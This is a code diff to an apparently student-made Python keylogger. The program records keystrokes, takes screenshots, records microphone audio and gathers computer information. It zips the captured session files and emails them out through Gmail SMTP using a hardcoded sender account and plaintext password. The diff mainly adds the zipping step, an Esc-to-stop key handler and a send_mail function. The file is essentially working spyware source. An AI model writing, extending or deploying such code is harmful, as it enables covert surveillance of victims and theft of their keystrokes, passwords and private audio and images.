@@ -8,7 +8,7 @@ from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from pynput import keyboard
-from pynput.keyboard import Listener
+from pynput.keyboard import Key, Listener
 import logging
 from PIL import ImageGrab
 from datetime import datetime
@@ -20,6 +20,7 @@ from scipy.io.wavfile import write
 import sounddevice as sd
 from requests import get
 import os
+import zipfile
 
 session_folder = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S"))
 os.mkdir(session_folder)
@@ -30,7 +31,7 @@ logging.getLogger("urllib3").setLevel(logging.WARNING)
 sender_email = "tnm031keylogger@gmail.com"
 receiver_email = "tnm031keylogger@gmail.com"
 password = "tnm031pizza"
-filename = "log_results.txt"
+
 subject = "Keys logged"
 body = "This is an email with attachment sent from Python"
 
@@ -50,21 +51,38 @@ def screenshot(image_name):
     im.save(session_folder + "\\" + image_name)
 
 
-with open(filename, "rb") as attachment:
-    # Add file as application/octet-stream
-    # Email client can usually download this automatically as attachment
-    part = MIMEBase("application", "octet-stream")
-    part.set_payload(attachment.read())
+# Declare the function to return all file paths of the particular directory
+def retrieve_file_paths(dirName):
+    # setup file paths variable
+    filePaths = []
 
-encoders.encode_base64(part)
+    # Read all directory, subdirectories and file lists
+    for root, directories, files in os.walk(dirName):
+        for filename in files:
+            # Create the full filepath by using os module.
+            filePath = os.path.join(root, filename)
+            filePaths.append(filePath)
 
-message.attach(part)
-text = message.as_string()
+    # return all paths
+    return filePaths
 
-context = ssl.create_default_context()
-with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
-    server.login(sender_email, password)
-    server.sendmail(sender_email, receiver_email, text)
+
+def send_mail(filename):
+    with open(filename, "rb") as attachment:
+        # Add file as application/octet-stream
+        # Email client can usually download this automatically as attachment
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+
+    encoders.encode_base64(part)
+
+    message.attach(part)
+    text = message.as_string()
+
+    context = ssl.create_default_context()
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, text)
 
 
 # get the computer information
@@ -102,6 +120,14 @@ def microphone():
 microphone()
 
 
+def on_release(key):
+    print('{0} release'.format(
+        key))
+    if key == Key.esc:
+        # Stop listener
+        return False
+
+
 # TODO: Fix special keys
 def on_press(key):
     global keys
@@ -125,6 +151,31 @@ def on_press(key):
         keys.append(k)
 
 
-if __name__ == '__main__':
-    with Listener(on_press=on_press()) as listener:
+def main():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+    # Assign the name of the directory to zip
+    dir_name = os.path.abspath(os.getcwd() + "\\" + session_folder)
+
+    # Call the function to retrieve all files and folders of the assigned directory
+    filePaths = retrieve_file_paths(dir_name)
+    print(filePaths)
+
+    # printing the list of all files to be zipped
+    print('The following list of files will be zipped:')
+    for fileName in filePaths:
+        print(fileName)
+
+    # writing files to a zipfile
+    zip_file = zipfile.ZipFile(dir_name + '.zip', 'w')
+
+    with zip_file:
+        # writing each file one by one
+        for file in filePaths:
+            zip_file.write(file)
+
+    print(dir_name + '.zip file is created successfully!')
+
+
+if __name__ == '__main__':
+    main()
